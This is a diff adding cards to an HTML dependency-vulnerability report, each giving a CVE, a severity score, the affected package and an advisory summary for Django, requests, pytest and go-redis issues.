+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2022-28346</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						SQL Injection in Django. An issue was discovered in Django 2.2 before 2.2.28, 3.2 before 3.2.13, and 4.0 before 4.0.4. `QuerySet.annotate()`, `aggregate()`, and `extra()` methods are subject to SQL injection in column aliases via a crafted dictionary (with dictionary expansion) as the passed `**kwargs`.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-13596</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						XSS in Django. An issue was discovered in Django version 2.2 before 2.2.13 and 3.0 before 3.0.7. Query parameters generated by the Django admin ForeignKeyRawIdWidget were not properly URL encoded, leading to a possibility of an XSS attack.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-9402</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						SQL injection in Django. Django 1.11 before 1.11.29, 2.2 before 2.2.11, and 3.0 before 3.0.4 allows SQL Injection if untrusted data is used as a tolerance parameter in GIS functions and aggregates on Oracle. By passing a suitably crafted tolerance to GIS functions and aggregates on Oracle, it was possible to break escaping and inject malicious SQL.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-45115</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Denial-of-service in Django. An issue was discovered in Django 2.2 before 2.2.26, 3.2 before 3.2.11, and 4.0 before 4.0.1. `UserAttributeSimilarityValidator` incurred significant overhead in evaluating a submitted password that was artificially large in relation to the comparison values. In a situation where access to user registration was unrestricted, this provided a potential vector for a denial-of-service attack.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-33203</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Path Traversal in Django. Django before 2.2.24, 3.x before 3.1.12, and 3.2.x before 3.2.4 has a potential directory traversal via django.contrib.admindocs. Staff members could use the TemplateDetailView view to check the existence of arbitrary files. Additionally, if (and only if) the default admindocs templates have been customized by application developers to also show file contents, then not only the existence but also the file contents would have been exposed. In other words, there is directory traversal outside of the template root directories.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2022-23833</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Infinite Loop in Django. An issue was discovered in MultiPartParser in Django 2.2 before 2.2.27, 3.2 before 3.2.12, and 4.0 before 4.0.2. Passing certain inputs to multipart forms could result in an infinite loop when parsing files.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-57833</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django is subject to SQL injection through its column aliases. An issue was discovered in Django 4.2 before 4.2.24, 5.1 before 5.1.12, and 5.2 before 5.2.6. FilteredRelation is subject to SQL injection in column aliases, using a suitably crafted dictionary, with dictionary expansion, as the **kwargs passed QuerySet.annotate() or QuerySet.alias().
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-48432</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django Improper Output Neutralization for Logs vulnerability. An issue was discovered in Django 5.2 before 5.2.2, 5.1 before 5.1.10, and 4.2 before 4.2.22. Internal HTTP response logging does not escape request.path, which allows remote attackers to potentially manipulate log output via crafted URLs. This may lead to log injection or forgery when logs are viewed in terminals or processed by external systems.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-45116</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Information disclosure in Django. An issue was discovered in Django 2.2 before 2.2.26, 3.2 before 3.2.11, and 4.0 before 4.0.1. Due to leveraging the Django Template Language&#39;s variable resolution logic, the dictsort template filter was potentially vulnerable to information disclosure, or an unintended method call, if passed a suitably crafted key.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2022-36359</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django vulnerable to Reflected File Download attack. An issue was discovered in the HTTP FileResponse class in Django 3.2 before 3.2.15 and 4.0 before 4.0.7. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a FileResponse when the filename is derived from user-supplied input.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2022-22818</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Cross-site Scripting in Django. The `{% debug %}` template tag in Django 2.2 before 2.2.27, 3.2 before 3.2.12, and 4.0 before 4.0.2 does not properly encode the current context. This may lead to XSS.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-24584</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django Incorrect Default Permissions. An issue was discovered in Django 2.2 before 2.2.16, 3.0 before 3.0.10, and 3.1 before 3.1.1 (when Python 3.7+ is used). The intermediate-level directories of the filesystem cache had the system&#39;s standard umask rather than 0o077.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-64459</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 6.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django vulnerable to SQL injection via _connector keyword argument in QuerySet and Q objects.. An issue was discovered in 5.1 before 5.1.14, 4.2 before 4.2.26, and 5.2 before 5.2.8.
+The methods `QuerySet.filter()`, `QuerySet.exclude()`, and `QuerySet.get()`, and the class `Q()`, are subject to SQL injection when using a suitably crafted dictionary, with dictionary expansion, as the `_connector` argument.
+Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected.
+Django would like to thank cyberstan for reporting this issue.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-3281</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django Directory Traversal via archive.extract. In Django 2.2 before 2.2.18, 3.0 before 3.0.12, and 3.1 before 3.1.6, the django.utils.archive.extract method (used by &#34;startapp --template&#34; and &#34;startproject --template&#34;) allows directory traversal via an archive with absolute paths or relative paths with dot segments.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-45452</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 1.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Directory-traversal in Django. Storage.save in Django 2.2 before 2.2.26, 3.2 before 3.2.11, and 4.0 before 4.0.1 allows directory traversal if crafted filenames are directly passed to it.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-24583</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django Incorrect Default Permissions. An issue was discovered in Django 2.2 before 2.2.16, 3.0 before 3.0.10, and 3.1 before 3.1.1 (when Python 3.7+ is used). FILE_UPLOAD_DIRECTORY_PERMISSIONS mode was not applied to intermediate-level directories created in the process of uploading files. It was also not applied to intermediate-level collected static directories when using the collectstatic management command.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-33571</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django Access Control Bypass possibly leading to SSRF, RFI, and LFI attacks . In Django 2.2 before 2.2.24, 3.x before 3.1.12, and 3.2 before 3.2.4, URLValidator, validate_ipv4_address, and validate_ipv46_address do not prohibit leading zero characters in octal literals. This may allow a bypass of access control that is based on IP addresses. (validate_ipv4_address and validate_ipv46_address are unaffected with Python 3.9.5+..) .
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-32052</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Header injection possible in Django. In Django 2.2 before 2.2.22, 3.1 before 3.1.10, and 3.2 before 3.2.2 (with Python 3.9.5+), URLValidator does not prohibit newlines and tabs (unless the URLField form field is used). If an application uses values with newlines in an HTTP response, header injection can occur. Django itself is unaffected because HttpResponse prohibits newlines in HTTP headers.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-64458</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django has a denial-of-service vulnerability in HttpResponseRedirect and HttpResponsePermanentRedirect on Windows. An issue was discovered in 5.1 before 5.1.14, 4.2 before 4.2.26, and 5.2 before 5.2.8.
+NFKC normalization in Python is slow on Windows. As a consequence, `django.http.HttpResponseRedirect`, `django.http.HttpResponsePermanentRedirect`, and the shortcut `django.shortcuts.redirect`  were subject to a potential  denial-of-service attack via certain inputs with a very large number of Unicode characters.
+Earlier, unsupported Django series (such as 5.0.x, 4.1.x, and 3.2.x) were not evaluated and may also be affected.
+Django would like to thank Seokchan Yoon for reporting this issue.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-45231</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Django allows enumeration of user e-mail addresses. An issue was discovered in Django v5.1.1, v5.0.9, and v4.2.16. The django.contrib.auth.forms.PasswordResetForm class, when used in a view implementing password reset flows, allows remote attackers to enumerate user e-mail addresses by sending password reset requests and observing the outcome (only when e-mail sending is consistently failing).
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-31542</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Path Traversal in Django. In Django 2.2 before 2.2.21, 3.1 before 3.1.9, and 3.2 before 3.2.1, MultiPartParser, UploadedFile, and FieldFile allowed directory traversal via uploaded files with suitably crafted file names.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-44420</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Potential bypass of an upstream access control based on URL paths in Django. In Django 2.2 before 2.2.25, 3.1 before 3.1.14, and 3.2 before 3.2.10, HTTP requests for URLs with trailing newlines could bypass upstream access control based on URL paths. This issue has low severity, according to the Django security policy.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2022-28347</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						SQL Injection in Django. A SQL injection issue was discovered in `QuerySet.explain()` in Django 2.2 before 2.2.28, 3.2 before 3.2.13, and 4.0 before 4.0.4. This occurs by passing a crafted dictionary (with dictionary expansion) as the `**options` argument, and placing the injection payload in an option name.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-13254</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Data leakage via cache key collision in Django. An issue was discovered in Django version 2.2 before 2.2.13 and 3.0 before 3.0.7. In cases where a memcached backend does not perform key validation, passing malformed cache keys could result in a key collision, and potential data leakage.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-28658</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 1.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> Django
+					</div>
+					<div class="vuln-description">
+						Directory Traversal in Django. In Django 2.2 before 2.2.20, 3.0 before 3.0.14, and 3.1 before 3.1.8, MultiPartParser allowed directory traversal via uploaded files with suitably crafted file names. Built-in upload handlers were not affected by this vulnerability.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-47081</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> requests
+					</div>
+					<div class="vuln-description">
+						Requests vulnerable to .netrc credentials leak via malicious URLs. ### Impact
+
+Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.
+
+### Workarounds
+For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).
+
+### References
+https://github.com/psf/requests/pull/6965
+https://seclists.org/fulldisclosure/2025/Jun/2
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-35195</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 6.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> requests
+					</div>
+					<div class="vuln-description">
+						Requests `Session` object does not verify requests after making first request with verify=False. When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.
+
+This occurs because the underlying connection is reused from the session&#39;s connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.
+
+This behavior affects versions of `requests` prior to 2.32.0.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2026-25645</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 6.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> requests
+					</div>
+					<div class="vuln-description">
+						Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function. ### Impact
+The `requests.utils.extract_zipped_paths()` utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one.
+
+### Affected usages
+**Standard usage of the Requests library is not affected by this vulnerability.** Only applications that call `extract_zipped_paths()` directly are impacted.
+
+### Remediation
+Upgrade to at least Requests 2.33.0, where the library now extracts files to a non-deterministic location.
+
+If developers are unable to upgrade, they can set `TMPDIR` in their environment to a directory with restricted write access.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2023-32681</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> requests
+					</div>
+					<div class="vuln-description">
+						Unintended leak of Proxy-Authorization header in requests. ### Impact
+
+Since Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).
+
+**Current vulnerable behavior(s):**
+
+1. HTTP → HTTPS: **leak**
+2. HTTPS → HTTP: **no leak**
+3. HTTPS → HTTPS: **leak**
+4. HTTP → HTTP: **no leak**
+
+For HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.
+
+The reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.
+
+### Patches
+Starting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3&#39;s ProxyManager.
+
+For users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn&#39;t make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.
+
+### Workarounds
+For users who are not able to update Requests immediately, there is one potential workaround.
+
+You may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you&#39;re currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.
+```
+import requests
+r = requests.get(&#39;http://github.com/&#39;, allow_redirects=False)
+```
+
+### Credits
+
+This vulnerability was discovered and disclosed by the following individuals.
+
+Dennis Brinkrolf, Haxolot (https://haxolot.com/)
+Tobias Funke, (tobiasfunke93@gmail.com)
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-71176</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> pytest
+					</div>
+					<div class="vuln-description">
+						pytest has vulnerable tmpdir handling. pytest through 9.0.2 on UNIX relies on directories with the `/tmp/pytest-of-{user}` name pattern, which allows local users to cause a denial of service or possibly gain privileges.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-29923</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> github.com/redis/go-redis/v9
+					</div>
+					<div class="vuln-description">
+						go-redis allows potential out of order responses when `CLIENT SETINFO` times out during connection establishment. ### Impact
+
+The issue only occurs when the `CLIENT SETINFO` command times out during connection establishment. The following circumstances can cause such a timeout:
+
+1. The client is configured to transmit its identity. This can be disabled via the `DisableIndentity` flag.
+2. There are network connectivity issues
+3. The client was configured with aggressive timeouts
+
+The impact differs by use case:
+
+* **Sticky connections**: Rather than using a connection from the pool on-demand, the caller can stick with a connection. Then you receive persistent out-of-order responses for the lifetime of the connection.
+* **Pipelines**: All commands in the pipeline receive incorrect responses.
+* **Default connection pool usage without pipelining**: When used with the default [ConnPool](https://github.com/redis/go-redis/blob/8fadbef84a3f4e7573f8b38e5023fd469470a8a4/internal/pool/pool.go#L77) once a connection is returned after use with [ConnPool#Put](https://github.com/redis/go-redis/blob/8fadbef84a3f4e7573f8b38e5023fd469470a8a4/internal/pool/pool.go#L366) the read buffer will be checked and the connection will be marked as bad due to the unread data. This means that at most one out-of-order response before the connection is discarded.
+
+### Patches
+We prepared a fix in https://github.com/redis/go-redis/pull/3295 and plan to release patch versions soon.
+
+### Workarounds
+You can prevent the vulnerability by setting the flag `DisableIndentity` (BTW: We also need to fix the spelling.) to `true` when constructing the client instance.
+
+### Credit
+
+Akhass Wasti
+Ramin Ghorashi
+Anton Amlinger
+Syed Rahman
+Mahesh Venkateswaran
+Sergey Zavoloka
+Aditya Adarwal
+Abdulla Anam
+Abd-Alhameed
+Alex Vanlint
+Gaurav Choudhary
+Vedanta Jha
+Yll Kelani
+Ryan Picard
+					</div>
+				</div>
 				
 			</div>
 			<footer>
